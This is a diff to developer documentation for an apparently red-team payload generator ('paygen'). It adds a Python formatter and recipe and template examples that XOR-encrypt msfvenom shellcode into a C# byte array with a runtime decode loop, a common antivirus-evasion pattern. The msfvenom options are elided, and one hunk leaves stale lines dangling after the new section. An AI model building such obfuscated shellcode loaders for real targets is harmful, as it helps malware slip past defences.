@@ -372,18 +372,31 @@ def main():
     data = base64.b64decode(args['data'])
 
     # Format as C# byte array
-    formatted = ", ".join([f"0x{b:02x}" for b in data])
-
-    output = {
-        'formatted': formatted,
-        'length': len(data)
-    }
-
-    print(json.dumps(output))
+    var_name = args.get('var_name', 'payload')
+    bytes_per_line = args.get('bytes_per_line', 16)
+    
+    lines = [f"byte[] {var_name} = new byte[{len(data)}] {{"]
+    for i in range(0, len(data), bytes_per_line):
+        chunk = data[i:i + bytes_per_line]
+        hex_values = ', '.join(f'0x{b:02x}' for b in chunk)
+        lines.append(f"    {hex_values},")
+    lines[-1] = lines[-1].rstrip(',')  # Remove trailing comma
+    lines.append("};")
+    
+    # Output formatted code directly as string
+    print('\n'.join(lines))
 
 if __name__ == "__main__":
     main()
 ```
+
+**Important Notes:**
+- Preprocessors receive input via JSON on stdin
+- Binary data (like shellcode) is automatically base64-encoded by paygen when passed between steps
+- Script preprocessors should output either:
+  - Plain text/code (stored as string)
+  - Valid JSON (parsed and stored as dictionary)
+- Command outputs (like msfvenom) are automatically base64-encoded for safe template passing
 
 ### Built-in Preprocessors
 
@@ -583,6 +596,7 @@ output:
 2. **Include all commands** - Copy-paste ready
 3. **Show alternatives** - Different execution methods
 4. **Safety warnings** - Remind about authorized use only
+5. **Plain text only** - Do NOT use markdown formatting (no `#` headers, `**bold**`, `` `code` ``, etc.). The TUI uses Rich markup for display, and markdown syntax will be shown literally to users.
 
 ### Testing
 
@@ -777,13 +791,77 @@ preprocessing:
   - type: "command"
     name: "generate_shellcode"
     command: "msfvenom -p ... -f raw"
-    output_var: "raw_shellcode"  # ← Name it raw_shellcode
+    output_var: "raw_shellcode"  # ← Automatically base64-encoded by paygen
   
   # Step 2: XOR encrypt
   - type: "script"
     name: "xor_encryption"
     script: "xor_encrypt.py"
     args:
+      data: "{{ raw_shellcode }}"  # ← Receives base64 string, decodes internally
+      key: "{{ xor_key }}"         # ← Key without 0x prefix
+    output_var: "xor_result"       # ← Named xor_result (JSON output)
+  
+  # Step 3: Format for C#
+  - type: "script"
+    name: "format_payload"
+    script: "format_csharp.py"
+    args:
+      data: "{{ xor_result.encrypted }}"  # ← Access .encrypted property from JSON
+      var_name: "buf"                     # ← Specify variable name
+      bytes_per_line: 15
+    output_var: "csharp_payload"          # ← Direct string output (formatted C# code)
+```
+
+**Template Pattern:**
+```csharp
+// XOR-encoded payload
+{{ csharp_payload | indent(12) }}  // ← Use csharp_payload directly with indent filter
+
+// Decode loop
+for (int j = 0; j < buf.Length; j++)
+{
+    buf[j] = (byte)((uint)buf[j] ^ 0x{{ xor_key }});  // ← Prepend 0x in template
+}
+```
+
+**Parameter Definition:**
+```yaml
+parameters:
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR encryption key (single byte, e.g., 'fa')"
+    required: false
+    default: fa  # ← NO QUOTES - renders as plain text, template adds 0x
+```
+
+### Critical Takeaways
+
+1. **Automatic Base64 Encoding**: Command outputs (like msfvenom raw bytes) are automatically base64-encoded by paygen when stored. This prevents binary data corruption when passing through Jinja2 templates.
+
+2. **Variable Naming Consistency**: The `output_var` name in preprocessing MUST match the variable used in the template
+   - Recipe uses `output_var: "csharp_payload"` → Template uses `{{ csharp_payload }}`
+   - Mismatch = empty or incorrect output
+
+3. **Preprocessor Output Types**:
+   - **JSON output**: Parsed and stored as dictionary (e.g., `xor_result.encrypted`)
+   - **Plain text output**: Stored as string (e.g., `csharp_payload`)
+   - **Command output**: Automatically base64-encoded for safe template passing
+
+4. **Hex Key Best Practice**:
+   - Recipe: `default: fa` (no quotes, no 0x)
+   - Template: `0x{{ xor_key }}` (add 0x prefix in template)
+   - Result: Renders as `0xfa` (valid C# hex literal)
+
+5. **format_csharp.py Behavior**: 
+   - Outputs complete C# declaration as plain text
+   - Use `var_name` parameter to specify array variable name
+   - Template uses `{{ csharp_payload | indent(N) }}` to insert with proper indentation
+
+6. **Compiler Field**:
+   - Recipe YAML uses `compile.command`, not `compile.compiler`
+   - Example: `command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"`
+   - TUI extracts compiler name from first word of command
       data: "{{ raw_shellcode }}"  # ← Use raw_shellcode
       key: "{{ xor_key }}"         # ← Key without 0x prefix
     output_var: "xor_result"       # ← Named xor_result
@@ -854,3 +932,22 @@ If your generated C# has `byte[] buf = new byte[] { };` (empty array):
 2. Verify you're accessing the correct property (e.g., `.encrypted`)
 3. Ensure the template variable exists in the preprocessing output
 4. Check preprocessor script is actually being executed (look for errors in build log)
+5. Remember: Command outputs are automatically base64-encoded - preprocessors handle decoding
+
+### Data Flow Summary
+
+```
+msfvenom (raw bytes)
+    ↓ [automatic base64 encoding]
+raw_shellcode (base64 string in template)
+    ↓ [passed to xor_encrypt.py]
+xor_encrypt.py (decodes base64, encrypts, outputs JSON)
+    ↓ [parsed as JSON dict]
+xor_result.encrypted (base64 string)
+    ↓ [passed to format_csharp.py]
+format_csharp.py (decodes base64, formats, outputs plain text)
+    ↓ [stored as string]
+csharp_payload (formatted C# code string)
+    ↓ [inserted into template]
+Final rendered template with shellcode
+```
